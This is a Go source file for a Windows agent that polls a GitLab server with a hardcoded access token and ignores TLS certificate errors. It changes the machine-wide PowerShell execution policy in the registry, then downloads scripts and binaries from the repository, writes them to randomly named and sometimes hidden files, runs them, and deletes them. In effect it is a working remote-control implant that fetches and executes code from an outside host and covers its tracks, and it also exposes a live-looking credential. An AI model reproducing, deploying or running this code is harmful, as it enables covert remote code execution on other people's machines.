package main

import (
   "encoding/json"
   "github.com/plouc/go-gitlab-client"
   "golang.org/x/sys/windows/registry"
   "fmt"
   "os/exec"
   "os"
   "strings"
   "time"
   "net/http"
   "crypto/tls"
   "math/rand"
   "bytes"
   "encoding/binary"
)

var(
   git_url = "https://git.yk-tb.com"
   git_token = "Qiu_GgUsmbKwHGr_A72g"
   conf_file = "tr2.json"
   branch_name = "windows"
   conf tr_config
)

type tr_module struct{
   Module string `json:"module"`
   Continue bool `json:"continue"`
   Content []string `json:"content"`
}

type tr_config struct{
   First_time time.Duration `json:"first"`
   Interval time.Duration `json:"interval"`
   Shell string `json:"shell"`
   Os string `json:"os"`
   Modules []tr_module `json:"modules"`
}

func main() {

   gl := gogitlab.NewGitlab(git_url, "/api/v3", git_token)
   gl.Client = set_ignore_tls()

   previous := ""
   time.Sleep(1*time.Minute)
   for {
      br := get_branch(gl)
      get_config(gl, br)
      if previous == "" || conf.Shell == "powershell"{enable_execution()}
      if previous == ""{time.Sleep(conf.First_time*time.Minute)}
      for _, module := range conf.Modules{
         if previous != br.Commit.Id || module.Continue{
            exec_file := get_items(gl, br, module)
            out := exec_module(exec_file)
            fmt.Println(out)
         }
      }
      previous = br.Commit.Id
      time.Sleep(conf.Interval*time.Minute)
   }

}

func set_ignore_tls() *http.Client{
   config := &tls.Config{InsecureSkipVerify: true}
   tr := &http.Transport{
      Proxy:           http.ProxyFromEnvironment,
      TLSClientConfig: config,
   }
   return &http.Client{Transport: tr}
}

func enable_execution(){
   k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell`, registry.SET_VALUE)
   if err!= nil{
      fmt.Println(err)
   }
   defer k.Close()
   err = k.SetStringValue("ExecutionPolicy", "RemoteSigned")
   if err!= nil{
      fmt.Println(err)
   }
}

func get_config(gl *gogitlab.Gitlab, br *gogitlab.Branch) {
   file, _ := gl.RepoRawFile("2", br.Commit.Id, "config/" + conf_file)
   parse_config([]byte(file))
}

func parse_config(raw_conf []byte){
   json.Unmarshal(raw_conf, &conf)
}

func get_branch(gl *gogitlab.Gitlab) *gogitlab.Branch{
   br, _ := gl.RepoBranch("2", branch_name)
   return br
}

func get_module_list(gl *gogitlab.Gitlab) []string{
   var module_list []string
   modules, _ := gl.RepoTree("2", "module", branch_name)
   for _, module := range modules{
      module_list = append(module_list, module.Name)
   }
   return module_list
}

func get_items(gl *gogitlab.Gitlab, br *gogitlab.Branch, module tr_module) string{
   file := get_module(gl, br, string(module.Module))
   if module.Content != nil{
      get_content(gl, br, module.Content)
   }
   filename := create_filename(module.Module)
   create_script(strings.TrimRight(string(file), "\n"), filename)
   return filename
}


func get_module(gl *gogitlab.Gitlab, br *gogitlab.Branch,  module_name string) string{
   file, _ := gl.RepoRawFile("2", br.Commit.Id, "module/" + module_name)
   return string(file)
}

func get_content(gl *gogitlab.Gitlab, br *gogitlab.Branch,  contents []string) {
   for _, content_name := range contents{
      data, _ := gl.RepoRawFile("2", br.Commit.Id, "content/" + content_name)
      buf := new(bytes.Buffer)
      binary.Write(buf, binary.LittleEndian, data)
      write_bin_file(buf, content_name)
   }
}

func write_bin_file(buf *bytes.Buffer, content_name string){
   file, err := os.Create(content_name)
   if err != nil {
    fmt.Println("file create err:", err)
    return
   }

   defer func(){
      file.Close()
   }()

   _, err2 := file.Write(buf.Bytes())
   if err2 != nil {
    fmt.Println("file write err:", err2)
    return
   }
}

func create_filename(module_name string) string{
   rand.Seed(time.Now().UnixNano())
   rand_name := fmt.Sprintf("%07d", rand.Intn(10000000))
   if conf.Shell == "powershell"{
      return module_name + "_" + rand_name + ".ps1"
   }else{
      return "." + module_name + "_" + rand_name
   }
}

func exec_module(exec_file string) string{
   out := exec_script(exec_file)
   delete_item(exec_file)
   return out
}

func create_script(data string, name string) {
   file, err := os.OpenFile(name, os.O_CREATE|os.O_WRONLY, 0666)

   if err != nil {
      fmt.Println(err, "create_script")
      os.Exit(1)
   }

   defer func(){
      file.Close()
   }()

   file.WriteString(data)
}

func exec_script(name string) string{
   out, err := exec.Command(conf.Shell, "./" + name).Output()
   if err!=nil{
      fmt.Println(err, "exec_script")
   }
   return string(out)
}

func delete_item(filename string) {
   os.Remove(filename)
}
